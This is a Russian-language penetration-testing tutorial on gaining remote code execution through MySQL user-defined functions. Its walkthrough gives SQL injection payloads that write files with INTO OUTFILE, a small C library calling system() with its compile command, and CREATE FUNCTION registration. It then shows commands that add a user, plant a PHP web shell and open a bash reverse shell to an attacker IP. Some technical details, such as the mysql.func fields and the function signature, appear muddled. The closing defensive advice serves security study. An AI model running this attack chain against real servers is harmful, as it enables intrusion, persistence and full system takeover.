# MySQL UDF: Загрузка кастомных функций для RCE

## Контекст и базовые понятия

Уязвимость, связанная с загрузкой пользовательских функций (User-Defined Functions, UDF) в MySQL, представляет собой классический вектор получения удалённого выполнения кода (Remote Code Execution, RCE) на сервере баз данных. Данная техника относится к категории атак на прямые сервисы СУБД и активно использовалась в арсенале пентестеров и злоумышленников для эскалации привилегий и закрепления в системе.

MySQL, будучи одной из самых распространённых реляционных СУБД в веб-разработке (особенно в стеке LAMP/LEMP), исторически обладал архитектурным решением, позволяющим расширять функциональность сервера через динамически загружаемые библиотеки. В отличие от стандартизированного SQL, который обеспечивает переносимость запросов между различными СУБД, механизм UDF является специфичной для MySQL (и производных, таких как MariaDB) возможностью. Это создаёт фундаментальное разграничение: стандартные SQL-инъекции работают на уровне языка запросов, тогда как UDF-атаки работают на уровне операционной системы и процесса сервера СУБД.

Ключевое понятие здесь — **UDF (User-Defined Function)**. Это функция, написанная разработчиком на языке C (или C++), скомпилированная в динамическую библиотеку (`.dll` для Windows, `.so` для Linux/Unix), и зарегистрированная в метаданных MySQL как встроенная функция. После регистрации такая функция становится доступна в SQL-запросах так же, как и встроенные функции (`COUNT`, `SUBSTRING` и т.д.).

Механизм работает следующим образом:
1.  Администратор или пользователь с привилегиями `FILE` загружает бинарный файл библиотеки в файловую систему сервера.
2.  Выполняется SQL-команда `CREATE FUNCTION`, которая связывает имя функции в MySQL с точкой входа (entry point) в загруженной библиотеке.
3.  При вызове этой функции из SQL-запроса процесс `mysqld` загружает библиотеку в свою адресную память и выполняет код из точки входа, передавая ей аргументы из запроса.

Поскольку процесс `mysqld` обычно запускается от имени привилегированного пользователя (например, `root` в Linux или `SYSTEM` в Windows), выполнение произвольного кода через UDF даёт атакующему полный контроль над сервером, на котором запущена СУБД.

Важно разграничивать UDF-атаки от других методов RCE в контексте баз данных:
*   **UDF vs. Stored Procedures:** Хранимые процедуры пишутся на PL/SQL или SQL-подобных языках и выполняются внутри движка СУБД. Они не могут напрямую вызывать системные API ОС. UDF, будучи нативным кодом, имеет прямой доступ к системным вызовам.
*   **UDF vs. General UDF (Generic UDF):** Существует два основных типа атак на UDF:
    1.  **Generic UDF:** Атакующий загружает заранее скомпилированную библиотеку с известной точкой входа (например, `do_system`), которая просто вызывает `system()` или `WinExec()`. Это самый распространённый и простой вектор.
    2.  **Custom/Specific UDF:** Атакующий пишет свою библиотеку с уникальной логикой, компилирует её и загружает. Это требует больше усилий, но позволяет обойти детектирование по сигнатурам.

В современных версиях MySQL (начиная с 5.1 и особенно в 8.0+) механизм загрузки UDF был существенно усложнён и ограничен из соображений безопасности. Однако уязвимые инсталляции (старые версии, неправильно настроенные среды, MariaDB с включённой поддержкой UDF) остаются критической угрозой.

| Характеристика | UDF (User-Defined Function) | Stored Procedure (Хранимая процедура) | Web Shell (Веб-шелл) |
| :--- | :--- | :--- | :--- |
| **Уровень выполнения** | Процесс `mysqld` (ОС-уровень) | Движок СУБД (SQL-уровень) | Веб-сервер (Apache/Nginx/IIS) |
| **Язык реализации** | C/C++ (бинарный код) | SQL/PL/pgSQL | PHP/Python/ASP.NET |
| **Требования к привилегиям** | `FILE` (для записи) + `INSERT` в `mysql.func` | `CREATE PROCEDURE` | Доступ к директории веб-сервера |
| **Детектирование** | Сложнее (бинарные файлы, системные вызовы) | Легче (анализ запросов) | Легче (анализ файлов, сетевой трафик) |
| **Потенциал воздействия** | Полный RCE на сервере БД | Ограничено возможностями СУБД | Полный RCE на веб-сервере |
| **Персистентность** | Высокая (библиотека на диске) | Высокая (в базе данных) | Высокая (файл на диске) |

## Внутреннее устройство предмета

Архитектура механизма UDF в MySQL базируется на взаимодействии между сервером СУБД, менеджером плагинов (в ранних версиях — прямым загрузчиком) и операционной системой. Понимание этого устройства необходимо для анализа векторов атаки и разработки средств защиты.

### Архитектура загрузки и выполнения UDF

Процесс работы с UDF можно разделить на три логических этапа: регистрация, загрузка и выполнение.

1.  **Регистрация (Metadata Registration):**
    MySQL хранит информацию о пользовательских функциях в системной таблице `mysql.func` (в старых версиях) или в таблицах системы каталогов (в новых, хотя прямой доступ к ней часто заблокирован). Эта таблица содержит следующие поля:
    *   `name`: Имя функции, которое будет использоваться в SQL-запросах.
    *   `dl`: Путь к динамической библиотеке на сервере.
    *   `type`: Тип функции (`unknown`, `integer`, `real`, `string`, `function`). Для RCE критичен тип `integer`, так как он указывает на функцию, возвращающую целое число (часто используется для обхода проверок типов).
    *   `type` (дополнительно): В некоторых реализациях есть поле `destructor`, `init`, `fill` и `clear`, указывающие на адреса функций в библиотеке.

    Команда `CREATE FUNCTION` добавляет запись в эту таблицу. Важно, что для успешной регистрации требуется привилегия `INSERT` на таблицу `mysql.func` и привилегия `FILE` для записи самой библиотеки в файловую систему.

2.  **Загрузка (Loading):**
    Когда сервер MySQL встречает вызов зарегистрированной UDF в запросе, он проверяет, загружена ли библиотека в память. Если нет, он использует системные функции загрузки динамических библиотек:
    *   На Linux/Unix: `dlopen()`
    *   На Windows: `LoadLibrary()`

    При загрузке сервер ищет точку входа. Для Generic UDF это обычно функция с именем `do_system` (или `udf_do_system`). Для кастомных UDF имя точки входа должно быть указано явно или соответствовать стандарту MySQL UDF API.

3.  **Выполнение (Execution):**
    После загрузки вызывается функция-обёртка, которая парсит аргументы из SQL-запроса и передаёт их в целевую функцию библиотеки. Если библиотека содержит функцию `do_system(const char* arg)`, она получает строку из SQL-запроса и вызывает системный вызов `system()` (на Linux) или `WinExec()`/`CreateProcess()` (на Windows).

### Структура библиотеки UDF

Динамическая библиотека UDF должна соответствовать специфическому ABI (Application Binary Interface) MySQL. Она должна экспортировать несколько функций, даже если атакующий использует только одну.

Стандартная структура экспортируемых символов для функции, возвращающей целое число (`type=integer`):

```c
// Иллюстративная структура экспорта для Generic UDF
// Реальные имена и сигнатуры зависят от версии MySQL

// Инициализация (вызывается один раз при загрузке)
my_bool udf_do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message);

// Основная функция (вызывается для каждой строки результата)
long long udf_do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);

// Деструктор (вызывается при завершении запроса)
void udf_do_system_deinit(UDF_INIT *initid);
```

Ключевые поля структуры `UDF_ARGS`:
*   `arg_count`: Количество переданных аргументов.
*   `args`: Массив указателей на строковые аргументы.
*   `lengths`: Массив длин аргументов.

Атакующий, использующий Generic UDF, полагается на то, что библиотека уже содержит функцию `udf_do_system`, которая интерпретирует первый аргумент как команду ОС.

### Условия возникновения уязвимости

Для успешной атаки через UDF необходимо соблюдение следующего набора условий:

1.  **Привилегия `FILE`:** Учётная запись, через которую выполняется инъекция, должна иметь привилегию `FILE`. Эта привилегия позволяет читать и писать файлы на сервере, где запущен `mysqld`. Без неё невозможно загрузить библиотеку.
2.  **Привилегия `INSERT` на `mysql.func`:** Необходимо иметь возможность вносить изменения в системную таблицу функций. В современных версиях MySQL эта таблица защищена, и даже `root` не может напрямую вставлять в неё без использования специальных механизмов (например, через `CREATE FUNCTION` с указанием пути).
3.  **Доступ к записи в файловую систему:** Путь к библиотеке должен быть доступен для записи. Обычно атакующие используют временные директории (`/tmp`, `/var/tmp`) или директории, где уязвимое веб-приложение имеет права на запись (например, `upload/`).
4.  **Совместимость архитектуры:** Бинарный файл библиотеки должен быть скомпилирован под ту же архитектуру (x86/x64) и ту же версию glibc (на Linux), что и процесс `mysqld`. Использование библиотеки, собранной для другой ОС или архитектуры, приведёт к краху сервера (Segfault) и не даст выполнения кода.
5.  **Отсутствие ASLR/DEP/NX:** Хотя современные ОС используют механизмы защиты памяти, загрузка UDF происходит через легитимный API (`dlopen`), который обычно обходит ограничения DEP (Data Execution Prevention), так как библиотека загружается в адресное пространство доверенного процесса. ASLR затрудняет предсказание адресов, но для Generic UDF это не критично, так как мы контролируем код внутри загруженной библиотеки.

### Сравнение механизмов загрузки в разных версиях

| Версия MySQL | Механизм загрузки | Ограничения |
| :--- | :--- | :--- |
| **< 5.1** | Прямая загрузка через `dlopen`/`LoadLibrary` | Минимальные. Достаточно `FILE` + `INSERT` в `mysql.func`. |
| **5.1 - 5.7** | Плагин-загрузчик (`plugin_dir`) | Требуется, чтобы путь к библиотеке находился в директории `plugin_dir` или был разрешён. Появились проверки на абсолютные пути. |
| **8.0+** | Строгая система плагинов | Прямая загрузка UDF через `CREATE FUNCTION` отключена или сильно ограничена. Требуется использование механизма плагинов (`INSTALL PLUGIN`). Таблица `mysql.func` удалена или недоступна для прямой записи. |

## Применение и работа с предметом

На практике работа с UDF-уязвимостями в рамках тестирования на проникновение включает несколько этапов: от подготовки артефактов до выполнения команд и очистки следов. Пентестеры используют как готовые инструменты (например, `sqlmap` с опцией `--os-shell`), так и ручные методы для обхода защитных механизмов.

### Подготовка и загрузка библиотеки

Первым шагом является получение доступа к файловой системе сервера через SQL-инъекцию. Для этого используется оператор `LOAD_FILE()` или `INTO OUTFILE`.

**Шаг 1: Проверка привилегий и возможности записи.**
Атакующий проверяет, может ли он писать файлы.

```sql
-- Проверка привилегии FILE
SELECT FILE_PRIV FROM mysql.user WHERE User = CURRENT_USER();

-- Попытка записи в /tmp (Linux) или C:\ (Windows)
SELECT 'shellcode' INTO OUTFILE '/tmp/shell.so';
-- Или
SELECT 'shellcode' INTO OUTFILE 'C:\\Windows\\Temp\\shell.dll';
```

Если `INTO OUTFILE` не работает из-за ограничений безопасности (например, `secure_file_priv`), атакующий может попытаться использовать `LOAD_FILE()` для чтения существующих файлов или найти другую директорию с правами на запись.

**Шаг 2: Загрузка библиотеки.**
Библиотека должна быть скомпилирована заранее. Для Generic UDF часто используется библиотека `udf.dll` или `lib_mysqludf_sys.so`.

```bash
# Пример компиляции Generic UDF на Linux
gcc -g -O2 -shared -fPIC -o lib_mysqludf_sys.so lib_mysqludf_sys.c
```

Загрузка в базу данных:

```sql
-- Запись бинарных данных в файл
SELECT LOAD_FILE('/path/to/shell.so') INTO OUTFILE '/tmp/shell.so';
-- Или, если есть доступ к веб-серверу, загрузка через веб-шелл
```

**Шаг 3: Регистрация функции.**
После размещения библиотеки необходимо зарегистрировать её в MySQL.

```sql
-- Создание функции do_system, которая будет вызывать system()
CREATE FUNCTION do_system RETURNS integer SONAME 'shell.so';
```

Если регистрация успешна, функция `do_system` становится доступна.

### Выполнение команд и эскалация

После регистрации атакующий может выполнять системные команды.

```sql
-- Выполнение команды id
SELECT do_system('id');

-- Создание нового пользователя (Linux)
SELECT do_system('useradd -m -s /bin/bash hacker');

-- Написание веб-шелла (если есть доступ к веб-директории)
SELECT do_system('echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php');
```

### Обход защитных механизмов

1.  **Блокировка `mysql.func`:** В MySQL 5.1+ таблица `mysql.func` может быть недоступна для прямой записи. В этом случае атакующий может использовать `CREATE FUNCTION` с указанием полного пути к библиотеке, если сервер позволяет относительные пути или если библиотека находится в `plugin_dir`.
2.  **Ограничение `secure_file_priv`:** Если эта переменная установлена, MySQL разрешает чтение/запись только в указанную директорию. Атакующий должен загрузить библиотеку именно туда.
3.  **Фильтрация команд:** Серверные WAF или встроенные фильтры могут блокировать опасные команды. Атакующие используют обфускацию, переменные окружения или вызовы других программ (например, `wget` для загрузки второго этапа).

### Типичные ошибки и подводные камни

*   **Крах сервера:** Если библиотека не соответствует архитектуре или содержит ошибки, процесс `mysqld` может упасть. Это приводит к отказу в обслуживании (DoS), но не даёт RCE.
*   **Очистка следов:** После атаки необходимо удалить загруженную библиотеку и запись из `mysql.func`, иначе администраторы могут обнаружить её в логах или файловой системе.
*   **Антивирусы и EDR:** Современные системы защиты могут обнаруживать загрузку подозрительных DLL/so файлов или попытки выполнения системных вызовов из процесса БД.

## Сквозной практический пример: Получение RCE через UDF на Linux

**Исходные условия:**
*   **Среда:** Виртуальная машина с Ubuntu 18.04, установленным MySQL 5.7.
*   **Уязвимость:** SQL-инъекция в параметре `id` веб-приложения (GET-запрос).
*   **Привилегии:** Уязвимый пользователь БД имеет привилегию `FILE`.
*   **Цель:** Получить удалённое выполнение кода на уровне ОС.
*   **Инструменты:** `sqlmap` (для автоматизации), `gcc` (для компиляции), `netcat` (для проверки).

### Шаг 1: Определение возможности записи файлов

Атакующий проверяет, может ли он записывать файлы в `/tmp` через SQL-инъекцию.

```sql
-- Payload для записи тестового файла
' UNION SELECT 1, 2, 3, 4, 5 INTO OUTFILE '/tmp/test.txt' -- -
```

**Ожидаемый вывод:** Если файл `/tmp/test.txt` создан, привилегия `FILE` активна и путь доступен. Если возникает ошибка `Access denied` или `secure_file_priv`, вектор требует обхода.

### Шаг 2: Компиляция и подготовка Generic UDF

Атакующий использует готовый исходный код Generic UDF (например, из репозитория `sqlmap` или `udf`).

```bash
# Создание исходного файла
cat > udf.c << EOF
#include <stdlib.h>
#include <string.h>

int do_system(void *arg) {
    char *cmd = (char *)arg;
    return system(cmd);
}
EOF

# Компиляция в разделяемую библиотеку
gcc -g -O2 -shared -fPIC -o libudf.so udf.c
```

### Шаг 3: Загрузка библиотеки в файловую систему сервера

Используя SQL-инъекцию, атакующий записывает бинарные данные библиотеки в `/tmp`.

```sql
-- Чтение локального файла udf и запись на сервер
LOAD_FILE('/path/to/local/libudf.so') INTO OUTFILE '/tmp/libudf.so'
```

*Примечание:* На практике это часто делается через загрузку файла на веб-сервер (если есть веб-шелл) и затем копирование в `/tmp` через UDF, или через прямую запись, если `secure_file_priv` разрешает `/tmp`.

### Шаг 4: Регистрация функции в MySQL

Атакующий регистрирует функцию `do_system` из загруженной библиотеки.

```sql
CREATE FUNCTION do_system RETURNS integer SONAME 'libudf.so';
```

**Ожидаемый вывод:** Если команда выполняется без ошибок, функция зарегистрирована. Проверка:

```sql
SELECT do_system('whoami');
```

**Ожидаемый результат:** В ответе SQL-запроса возвращается UID пользователя, от имени которого запущен `mysqld` (обычно `root` или `mysql`).

### Шаг 5: Выполнение произвольной команды

Атакующий выполняет команду для создания обратного шелла (reverse shell).

```sql
SELECT do_system('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1');
```

**Ожидаемый вывод:** На машине атакующего (на порту 4444) открывается интерактивная оболочка с привилегиями `root` (или пользователя БД).

### Ожидаемый вывод примера

Этот пример демонстрирует полный цикл атаки: от эксплуатации SQL-инъекции до получения RCE через UDF. Ключевым моментом является использование привилегии `FILE` для размещения бинарного артефакта и последующей регистрации его в метаданных СУБД. Успех зависит от совместимости архитектуры и отсутствия строгих ограничений на загрузку плагинов.

## Аналитический вывод

Атака через пользовательские функции (UDF) в MySQL представляет собой мощный вектор получения полного контроля над сервером баз данных, обходящий ограничения уровня приложения и переходящий на уровень операционной системы. Исторически этот метод был одним из самых эффективных для эскалации привилегий в уязвимых инсталляциях MySQL 5.x благодаря относительно простому механизму загрузки динамических библиотек.

Ключевым фактором успеха атаки является наличие привилегии `FILE` у учётной записи, через которую осуществляется инъекция. Без этой привилегии загрузка бинарного артефакта невозможна. Современные версии MySQL (8.0+) существенно ограничили этот вектор, отказавшись от прямой записи в `mysql.func` и внедрив строгую систему плагинов, что делает классическую Generic UDF-атаку менее применимой без дополнительных уязвимостей (например, LFI или обхода ограничений `secure_file_priv`).

Для специалистов по информационной безопасности защита от UDF-атак включает:
1.  Минимизацию привилегий учётных записей приложений (отзыв `FILE` там, где он не нужен).
2.  Настройку `secure_file_priv` для ограничения директорий записи.
3.  Регулярное обновление СУБД до последних версий.
4.  Мониторинг создания новых плагинов и подозрительных вызовов системных функций из процесса `mysqld`.

Несмотря на снижение актуальности в новых версиях, понимание механизма UDF остаётся критически важным для анализа уязвимостей в легаси-системах и для разработки средств обнаружения аномальной активности в процессах баз данных.
